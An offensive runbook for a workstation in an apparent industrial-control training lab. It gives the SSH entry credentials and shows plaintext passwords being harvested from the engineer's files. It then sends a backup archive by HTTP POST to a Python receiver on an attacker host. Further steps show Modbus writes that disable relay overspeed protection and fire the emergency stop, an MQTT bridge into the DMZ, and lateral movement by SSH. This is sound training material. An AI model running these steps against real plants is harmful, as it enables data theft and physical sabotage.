# Runbook: uupl-eng-ws

## Entry

SSH on port 22 as `engineer`. The password is in the 2019 network map buried in
the backup archive on hex-legacy-1, or in the engineering notes on any lateral
pivot that has already visited the operational zone.

```
ssh engineer@10.10.2.30
```

Password: `spanner99` (from `C:\UUPL\NETWORK.TXT` on hex-legacy-1, or from
`backups\PLC_Backup_2019.tar.gz` on this workstation once you are in).

wizzards-retreat has an authorised SSH key for this workstation. If you already
have a shell there, the key pivot works without a password.

## Identity and network

The first question on a dual-homed host is always: what does it touch?

```powershell
whoami
```

Returns `ot.local\engineer`. Standard domain account.

```powershell
hostname
```

Returns `ENG-WS01`.

```powershell
ipconfig
```

Two NICs. `eth1` at `10.10.2.30` (operational zone). `eth2` at `10.10.3.100`
(control zone). This box has a direct path to every PLC, relay, and HMI on the
control network. That is the find.

```powershell
route print
```

Default gateway via `10.10.2.202`. The control-zone subnet (`10.10.3.0/24`) is
directly attached on `eth2`, no routing hop required.

```powershell
netstat -ano
```

The cron-driven poll process connects to `10.10.3.21:502` (PLC Modbus) and POSTs
to `10.10.2.10:8080` (historian ingest) roughly every minute. Both connections
show up in the active socket list.

## Credential hunting

```powershell
cat config\plc-access.conf
```

The entire OT device inventory: IP, port, protocol, unit ID, and operational
notes for every PLC, relay, actuator, HMI, and breaker. Written by Ponder
Stibbons in 2001 and updated ever since. The relay web credentials
(`admin/relay1234`) are in the notes column.

```powershell
cat Documents\engineering_notes.txt
```

Consolidates credentials across multiple systems: historian DB password
(`Historian2015`), SCADA web login (`admin/admin`) and SSH (`scada_admin /
W1nd0ws@2016`), historian SSH (`hist_admin / Historian2015`), and HMI access.
The author's note "it's fine" appears next to the historian password.

```powershell
cat Projects\Firmware\README.txt
```

PLC admin credentials in plain text: `admin / turbineadmin`. Listed under
"Prerequisites". The firmware update script on the Desktop echoes the same
credentials.

```powershell
cat Desktop\update_plc_firmware.ps1
```

```powershell
cat Tools\send_alarm.ps1
```

The alarm relay script carries the SMTP password (`plantmail123`) in plain text.
The same credential is in `C:\SCADA\Config\scada.ini` on the SCADA server and
in the SCADA `/config` endpoint.

```powershell
cat Tools\poll_and_ingest.py
```

The historian ingest credentials (`hist_read / history2017`) are hardcoded here.
This is the account used to POST readings; it also works against the `/report`
endpoint for read access.

## Backup archive

```powershell
dir backups\
```

One file: `PLC_Backup_2019.tar.gz`. Start a receiver on wizzards-retreat and push from
this shell:

From wizzards-retreat (before logging in here):

```bash
mkdir -p /tmp/loot
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
class R(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get('Content-Length', 0))
        open('/tmp/loot/' + self.path.strip('/'), 'wb').write(self.rfile.read(n))
        self.send_response(200); self.end_headers()
    def log_message(self, *a): pass
HTTPServer(('10.10.2.3', 9999), R).serve_forever()
" &
```

From this shell:

```powershell
iwr -Method POST -Uri http://10.10.2.3:9999/PLC_Backup_2019.tar.gz -InFile backups\PLC_Backup_2019.tar.gz
```

Full exfil chain to unseen-gate: `books2/eng-ws-exfil.md`.

Inside: `plc-access-2019.conf` with the 2019 pre-audit credential set, and
`network_map_2019.txt`, the most complete device map in the lab. The map names
every operational and control zone host with its IP, username, and password.

## PLC project files

```powershell
cat Projects\PLC\turbine_controller.project
```

The exported PLC project file. Contains the full register map (coil 0 is the
emergency stop), the admin password (`turbineadmin`), and the firmware version.
Also documents that Modbus TCP has no authentication: "The network IS the access
control."

```powershell
cat Projects\RelayConfigs\relay_a_2019.txt
```

Relay A protection thresholds in the Modbus holding register map. HR[0] is
undervoltage threshold, HR[1] is overspeed, HR[2] is overcurrent. All are
writable via Modbus with no authentication. Reducing HR[1] allows overspeed
conditions to persist without a trip.

## PSReadLine history

```powershell
cat AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

Shows recent sessions: Modbus reads against the turbine PLC, historian queries,
SCADA access, and SSH sessions to both the HMI and the SCADA server. The
command history confirms which hosts were recently active and what the engineer
was looking at.

## Modbus access

The Python tools are ready to use. The venv is on PATH.

```powershell
python Tools\modbus_read.py 10.10.3.21 502 input 0 5
```

Live turbine input registers: RPM, temperature, pressure, voltage, current.

```powershell
python Tools\modbus_read.py 10.10.3.21 502 holding 0 4
```

Governor setpoint, fuel valve command, cooling pump speed, overcurrent threshold.

```powershell
python Tools\modbus_read.py 10.10.3.31 502 holding 0 3
```

Relay A protection thresholds. Write HR[1]=0 to zero the overspeed threshold
and prevent the relay from acting on an overspeed condition.

```powershell
python Tools\modbus_write.py 10.10.3.21 502 coil 0 1
```

Emergency stop. Writes coil 0 high. The runbook note says: "DO NOT write coil 0
without coordination with the duty engineer." There is no other access control.

## MQTT telemetry tools

The workstation carries two ad-hoc Python scripts in `Tools\` that are not
covered by any official runbook. They appear in PSReadLine history, indicating
regular use by the engineering team.

```powershell
python Tools\mqtt_check.py
```

Subscribes to `uupl/turbine/telemetry` on the internal broker at `10.10.3.60`.
Prints a live JSON stream: RPM, voltage, current, frequency, valve position, and
alarm flags as the PLC publishes them. No credentials required; the broker allows
anonymous connections.

```powershell
python Tools\mqtt_bridge.py
```

Bridges `uupl/turbine/telemetry` from the internal broker (`10.10.3.60`) to
`clacks-relay` in the DMZ (`10.10.5.12:1883`), republishing under `relay/`. The
script was written to feed a DMZ monitoring dashboard and was never decommissioned.
Running it from an attacker session relays live control-zone telemetry northbound
into the DMZ for the duration of the session. clacks-relay also allows anonymous
connections.

## Lateral movement

The SSH known_hosts file lists every host the workstation has connected to.

```powershell
cat .ssh\known_hosts
```

From here, SSH reaches operational and control-zone hosts without a gateway hop:

```
ssh hist_admin@10.10.2.10
ssh scada_admin@10.10.2.20
```

The HMI (`10.10.3.10`) has no SSH. It runs FUXA on port 1881; anonymous read is
active and no login is required to pull the project configuration.

All credentials are in `engineering_notes.txt`. The SSH key in `.ssh\id_rsa` may
also be accepted on control-zone hosts that were provisioned with the engineer's
public key.

## Poll log

```powershell
cat plc_poll.log
```

The cron-driven ingest process logs each poll cycle. The log confirms PLC is
reachable and gives a live view of turbine state (RPM, temperature, pressure)
timestamped to the minute. On a real engagement, a log with hundreds of entries
at :00 of every minute is the first confirmation that the workstation has been
running plant operations continuously.

## To investigate

- `schtasks /query` lists scheduled tasks. The poll cron is a Linux crontab,
  not a Windows scheduled task, so the facade's `schtasks` output does not
  reflect it.
